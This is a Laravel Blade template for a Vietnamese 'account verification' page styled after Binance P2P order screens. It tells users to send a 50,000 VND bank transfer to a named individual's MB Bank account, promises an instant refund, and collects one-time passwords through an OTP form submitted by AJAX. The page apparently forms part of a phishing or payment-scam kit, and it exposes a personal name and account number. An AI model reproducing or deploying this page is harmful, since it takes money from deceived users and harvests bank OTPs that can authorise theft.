@extends('frontend.layouts.main')
@section('content')
    <style>
        .css-1htc24x {
            height: auto;
            width: auto;
            padding: 18px 59px;
            font-size: 18px;
            margin-top: 19px !important;
        }
        div#bank-otp-wrapper {
            width: 100%;
            display: block;
        }
        .css-164229y {
            display: flex;
            flex-direction: row;
        }
        .css-vb7ksi .css-10nf7hq {
            width: 68% !important;
        }
        .css-vb7ksi .css-vspdms {
            width: auto !important;;
        }
    </style>
    <main class="main-content css-vurnku">
        <div class="css-ny4q9y">
            <div class="css-d49pd text-center p-4">
                <h1 class="verify-status">
                    @if (isset($verified))
                        Tài khoản của bạn đã được xác minh
                    @endif
                    @if (isset($pending))
                        Vui lòng thanh toán
                    @endif
                </h1>
            </div>
        </div>

        <div class="css-g2mx2m">
                <div class="css-1n1my9o">
                    <div class="css-1rql8v5">

                        <div class="css-10nf7hq">
                            <div data-bn-type="text" class="css-l9jms3 theme--text-light theme--text">{{ __('verify.order_placed') }}
                            </div>
                        </div>
                        <div class="css-161fc19">
                            <div data-bn-type="text" class="css-rt4opq theme--text-light theme--text">{{ __('verify.payment_time') }}
                                <div class="css-1f9551p">
                                    <div class="css-1k5ro4k">
                                        <div class="css-yw9f4w">
                                            <div data-bn-type="text" class="minute-tens css-niwjst"></div>
                                        </div>
                                        <div class="css-yw9f4w">
                                            <div data-bn-type="text" class="minute-ones css-niwjst"></div>
                                        </div>:<div class="css-yw9f4w">
                                            <div data-bn-type="text" class="second-tens css-niwjst"></div>
                                        </div>
                                        <div class="css-yw9f4w">
                                            <div data-bn-type="text" class="second-ones css-niwjst"></div>
                                        </div>

                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="css-18pto7p">
                        <div class="css-10nf7hq">
                            <div data-bn-type="text" class="css-fhtmef">{{ __('verify.order_number') }}</div>
                            <div data-bn-type="text" class="css-3my46j theme--text-light">{{ $bankData['uuid'] }}</div>
                            <div class="css-1f9551p"></div>
                        </div>
                        <div class="css-kah20n">
                            <div data-bn-type="text" class="css-fhtmef">{{ __('verify.created') }}</div>
                            <div data-bn-type="text" class="css-3my46j theme--text-light">
                                {{ \Carbon\Carbon::parse($bankData['created_at'])->setTimezone('Asia/Ho_Chi_Minh') }}
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="css-ny4q9y dark-mode-background">
                <div class="css-d49pd">
                    <div class="css-1c7ksm9">
                        <div class="css-hkht7k">
                            <div class="css-hkg8yb">
                                <div id="order-detail-container" class="css-ufg8u0">
                                    <div class="css-4cffwv">
                                        <div class="css-1g9n4q8">
                                            <div class="css-1o6lork">1</div>
                                            <div class="css-1afiqm5"></div>
                                        </div>
                                        <div class="css-1tr0qpm">
                                            <div class="css-12xnkhk">
                                                <div class="css-1ij6mzy">
                                                    <div class="css-1wm8bgi">
                                                        <div data-bn-type="text" class="css-4q9gwc theme--text">
                                                            {{ __('verify.confirm_order') }}</div>
                                                    </div>
                                                    <div role="button" id="C2COrderDetail_buyOrderInfo_btn_info"
                                                        class="css-me3g1k"><svg xmlns="http://www.w3.org/2000/svg"
                                                            viewBox="0 0 24 24" fill="none" class="css-1iztezc">
                                                            <path fill-rule="evenodd" clip-rule="evenodd"
                                                                d="M12.11 12.178L16 8.287l1.768 1.768-5.657 5.657-1.768-1.768-3.889-3.889 1.768-1.768 3.889 3.89z"
                                                                fill="currentColor"></path>
                                                        </svg></div>
                                                </div>
                                                <div class="css-1n0o39o">
                                                    <div class="css-1xxc2ay">
                                                        <div data-bn-type="text" class="css-bwnouq"><span
                                                                class="css-12cl38p">{{ __('verify.money') }}</span>
                                                            <div class="css-nbvh49">
                                                                <div class="css-vurnku"><svg
                                                                        xmlns="http://www.w3.org/2000/svg"
                                                                        viewBox="0 0 24 24" fill="none"
                                                                        class="css-xku7ik">
                                                                        <path fill-rule="evenodd" clip-rule="evenodd"
                                                                            d="M12 21a9 9 0 100-18 9 9 0 000 18zM10.75 8.5V6h2.5v2.5h-2.5zm0 9.5v-7h2.5v7h-2.5z"
                                                                            fill="currentColor"></path>
                                                                    </svg></div>
                                                            </div>
                                                        </div>
                                                        <div data-bn-type="text" class="css-vwvc5o"
                                                            style="line-height: 28px;">
                                                            50.000 vnd</div>
                                                    </div>

                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="css-4cffwv">
                                        <div class="css-1g9n4q8">
                                            <div class="css-1o6lork">2</div>
                                            <div class="css-1afiqm5"></div>
                                        </div>
                                        <div class="css-1tr0qpm">
                                            <div class="css-ot2ytd">
                                                <div data-bn-type="text" class="css-4q9gwc theme--text">Thanh toán</div>
                                                <div data-bn-type="text" class="css-1dmj7t7 theme--text">
                                                    @if (!isset($verified) && false)
                                                    Xác minh bằng chuyển khoản ngân hàng 50K: Bạn sẽ được hoàn tiền ngay lập tức kèm mã OTP xác minh trong nội dung. Thời gian hoàn thành là ngay tức thì sau khi bạn nhập mã OTP.
                                                    @else
                                                    Xác minh bằng chuyển khoản ngân hàng 50K: Bạn sẽ được hoàn tiền ngay lập tức.
                                                    @endif
                                                    <div class="css-1f9551p"><svg xmlns="http://www.w3.org/2000/svg"
                                                            viewBox="0 0 24 24" fill="none" class="css-1pp0nin">
                                                            <path fill-rule="evenodd" clip-rule="evenodd"
                                                                d="M12 21a9 9 0 100-18 9 9 0 000 18zM10.75 8.5V6h2.5v2.5h-2.5zm0 9.5v-7h2.5v7h-2.5z"
                                                                fill="currentColor"></path>
                                                        </svg></div>
                                                </div>
                                                @if (!\Carbon\Carbon::now()->greaterThan($bankData['expired_in']))
                                                <div class="css-vb7ksi">
                                                    <div class="css-qbxz06" style="width:100%;">
                                                        <div class="css-1gou3t8">
                                                            <div class="css-7aqo2m">
                                                                <div class="css-1x9ln48 dark-mode-background">
                                                                    <div class="css-2tdjbu"></div>
                                                                    <div data-bn-type="text" class="css-13ieqgy theme--text">Chuyển
                                                                        khoản ngân hàng</div>
                                                                </div>
                                                                <div class="qr-code-verify" style="padding:10px;">
                                                                    <img src="{{ $bankData['qrCode']['qrCode'] }}">
                                                                </div>
                                                            </div>
                                                            
                                                        </div>
                                                        <div class="css-1f5v8tq">
                                                            <div class="css-epiuoh">
                                                                <div class="css-164229y">
                                                                    <div class="css-10nf7hq">
                                                                        <div data-bn-type="text" class="css-vspdms theme--text">Nội dung chuyển khoản</div>
                                                                        <div class="css-1f9551p"><svg
                                                                                xmlns="http://www.w3.org/2000/svg"
                                                                                viewBox="0 0 24 24" fill="none"
                                                                                class="css-1kvlt27">
                                                                                <path fill-rule="evenodd"
                                                                                    clip-rule="evenodd"
                                                                                    d="M12 21a9 9 0 100-18 9 9 0 000 18zM10.75 8.5V6h2.5v2.5h-2.5zm0 9.5v-7h2.5v7h-2.5z"
                                                                                    fill="currentColor"></path>
                                                                            </svg></div>
                                                                    </div>
                                                                    <div class="css-1gmq84w">
                                                                        <div data-bn-type="text" class="css-6uwbzv theme--text"
                                                                            data-copy-target="content">
                                                                            {{ $bankData['qrCode']['content'] }}
                                                                        </div>
                                                                        <svg xmlns="http://www.w3.org/2000/svg"
                                                                            viewBox="0 0 24 24" fill="none"
                                                                            id="C2CorderDetail_btn_copy_paymentItem"
                                                                            class="css-1g6lkvi" data-action="copy"
                                                                            data-target="content"
                                                                            style="vertical-align: -6px; cursor: pointer;">
                                                                            <path fill-rule="evenodd" clip-rule="evenodd"
                                                                                d="M9 3h11v13h-3V6H9V3zM4 8v13h11V8.02L4 8z"
                                                                                fill="currentColor"></path>
                                                                        </svg>
                                                                    </div>
                                                                </div>
                                                                <div class="css-164229y">
                                                                    <div class="css-10nf7hq">
                                                                        <div data-bn-type="text" class="css-vspdms theme--text">Chủ tài khoản
                                                                        </div>
                                                                    </div>
                                                                    <div class="css-1gmq84w">
                                                                        <div data-bn-type="text" class="css-6uwbzv"
                                                                            data-copy-target="accountName theme--text">
                                                                            PHAM TRONG NAM</div><svg
                                                                            xmlns="http://www.w3.org/2000/svg"
                                                                            viewBox="0 0 24 24" fill="none"
                                                                            id="C2CorderDetail_btn_copy_paymentItem"
                                                                            class="css-1g6lkvi" data-action="copy"
                                                                            data-target="accountName"
                                                                            style="vertical-align: -6px; cursor: pointer;">
                                                                            <path fill-rule="evenodd" clip-rule="evenodd"
                                                                                d="M9 3h11v13h-3V6H9V3zM4 8v13h11V8.02L4 8z"
                                                                                fill="currentColor"></path>
                                                                        </svg>
                                                                    </div>
                                                                </div>
                                                                <div class="css-164229y">
                                                                    <div class="css-10nf7hq">
                                                                        <div data-bn-type="text" class="css-vspdms theme--text">Số tài khoản</div>
                                                                    </div>
                                                                    <div class="css-1gmq84w">
                                                                        <div data-bn-type="text" class="css-6uwbzv theme--text"
                                                                            data-copy-target="accountNumber">
                                                                            30123488888</div><svg
                                                                            xmlns="http://www.w3.org/2000/svg"
                                                                            viewBox="0 0 24 24" fill="none"
                                                                            id="C2CorderDetail_btn_copy_paymentItem"
                                                                            class="css-1g6lkvi" data-action="copy"
                                                                            data-target="accountNumber"
                                                                            style="vertical-align: -6px; cursor: pointer;">
                                                                            <path fill-rule="evenodd" clip-rule="evenodd"
                                                                                d="M9 3h11v13h-3V6H9V3zM4 8v13h11V8.02L4 8z"
                                                                                fill="currentColor"></path>
                                                                        </svg>
                                                                    </div>
                                                                </div>
                                                                <div class="css-164229y">
                                                                    <div class="css-10nf7hq">
                                                                        <div data-bn-type="text" class="css-vspdms theme--text">Tên ngân hàng</div>
                                                                    </div>
                                                                    <div class="css-1gmq84w">
                                                                        <div data-bn-type="text" class="css-6uwbzv theme--text"
                                                                            data-copy-target="bankName">
                                                                            Ngân Hàng Quân Đội</div>
                                                                        <!-- <svg
                                                                            xmlns="http://www.w3.org/2000/svg"
                                                                            viewBox="0 0 24 24" fill="none"
                                                                            id="C2CorderDetail_btn_copy_paymentItem"
                                                                            class="css-1g6lkvi" data-action="copy"
                                                                            data-target="bankName"
                                                                            style="vertical-align: -6px; cursor: pointer;">
                                                                            <path fill-rule="evenodd" clip-rule="evenodd"
                                                                                d="M9 3h11v13h-3V6H9V3zM4 8v13h11V8.02L4 8z"
                                                                                fill="currentColor"></path>
                                                                        </svg> -->
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                @else
                                                <h3 style="margin-top:10px;">Đơn hàng đã hết hạn</h3>
                                                @endif
                                            </div>
                                        </div>
                                    </div>
                                    @if (!isset($verified))
                                    <div class="css-4cffwv">
                                        <div class="css-1g9n4q8">
                                            <div class="css-1o6lork">3</div>
                                        </div>
                                        <div class="css-1tr0qpm">
                                            <div class="css-1arnokf">
                                                <div class="css-1hph6e4">
                                                    <div class="css-uliqdc">
                                                        <div data-bn-type="text" class="css-4q9gwc theme--text">Đợi xác minh</div>
                                                        <div class="css-1w1kjhg">
                                                            <div data-bn-type="text" class="css-spxc6d theme--text">Sau khi bạn chuyển khoản cho hệ thống, hệ thống sẽ hoàn trả ngay lập tức
                                                                <div class="css-1f9551p"><svg
                                                                        xmlns="http://www.w3.org/2000/svg"
                                                                        viewBox="0 0 24 24" fill="none"
                                                                        class="css-1pp0nin">
                                                                        <path fill-rule="evenodd" clip-rule="evenodd"
                                                                            d="M12 21a9 9 0 100-18 9 9 0 000 18zM10.75 8.5V6h2.5v2.5h-2.5zm0 9.5v-7h2.5v7h-2.5z"
                                                                            fill="currentColor"></path>
                                                                    </svg></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="css-ygbf2l">
                                                @include('frontend.includes.bank-otp-wrapper')
                                                </div>
                                                @if (!\Carbon\Carbon::now()->greaterThan($bankData['expired_in']) && false)
                                                <div class="css-ygbf2l">
                                                    @if (isset($verified))
                                                    <a style="margin: 0px auto;" href="{{ route('index') }}" id="C2COrderDetail_btn_transferred" class=" css-1htc24x">
                                                        <span class="verify-status">Tài khoản đã được xác minh</span>
                                                    </a>
                                                    @elseif (isset($pending))
                                                        <a style="margin: 0px auto;" href="javascript:;" class=" css-1htc24x">
                                                            <span class="verify-status">Đang xác minh thanh toán</span>
                                                        </a>
                                                    @endif
                                                </div>
                                                @endif
                                            </div>
                                        </div>
                                    </div>
                                    @endif
                                    @if (isset($verified))
                                    <a class="mt-5 btn btn-primary btn-outline-secondary btn-verify" href="{{ route('transaction') }}">Tiếp tục giao dịch</a>
                                    @endif
                                </div>

                            </div>
                            
                        </div>
                    </div>
                </div>
            </div>
    </main>
@endsection

@section('script')
    @if (isset($pending))
        <script>            
            const intervalCheckSendOtp = setInterval(checkOtpStatus, 30000); //30000 MS == 30 seconds
            document.addEventListener('DOMContentLoaded', function() {
                checkOtpStatus();
            })
            function checkOtpStatus() {
                const uuid = @json($bankData['uuid']);
                $.ajax({
                    method: 'get',
                    url: @json(route('check-send-otp')),
                    data: {
                        uuid
                    },
                    success: function(response) {
                        if (response.verified) {
                            $('#bank-otp-wrapper').addClass('d-none');
                            $('.verify-status').text(response.message);
                            window.location.reload();
                            return clearInterval(intervalCheckSendOtp)
                        }
                        if (response.sent) {
                            // console.log(response.message_type)
                            if (response.message_type == 2) {
                                $('#bank-otp-wrapper').addClass('d-none');
                            } else {
                                $('#bank-otp-wrapper').removeClass('d-none');
                            }
                            $('.verify-status').html(response.message);
                            return false;
                        }
                        $('#bank-otp-wrapper').addClass('d-none');
                        $('.verify-status').html(response.message);
                    }
                })
            }
            function getFormData(formId) {
                let formData = {};
                let inputs = $('#' + formId).serializeArray();
                $.each(inputs, function(i, input) {
                    formData[input.name] = input.value;
                });
                return formData;
            }
            $('#submitOtp').on("click", function() {
                $.ajax({
                    method: 'post',
                    url: @json(route('verify-otp')),
                    data: {
                        _token: $('meta[name="csrf-token"]').attr('content'),
                        ...getFormData('form-otp')
                    },
                    success: function(response) {
                        console.log(response)
                        if (response.sent) {
                            $('#bank-otp-wrapper').removeClass('d-none');
                            return $('.verify-status').text(response.message)
                        }
                        if (response.success) {
                            $('#payment-button').removeClass('d-none');
                            $("#form-otp").addClass('d-none');
                            return $('.verify-status').text(response.message);
                        }
                        $('.verify-status').text(response.message);
                    }
                })
            })
        </script>
    @endif
    <script>
        @if (!\Carbon\Carbon::now()->greaterThan($bankData['expired_in']))
            let endTime = "{{ $bankData['expired_in'] }}";
            startTimer(endTime);
        @endif
        jQuery( document ).ready( function(){
            jQuery('#do_process').on("click", function() {
                const uuid = @json($bankData['uuid']);
                $.ajax({
                    method: 'get',
                    url: @json(route('check-send-otp')),
                    data: {
                        uuid,
                        task: 'da_chuyen_tien'
                    },
                    success: function(response) {
                        if( response.reload ){
                            window.location.reload();
                        }
                    },
                    error: function(xhr, status, error) {
                        if (xhr.status === 419) {
                            window.location.reload();
                        }
                    }
                })
            });
        });

    </script>
@endsection

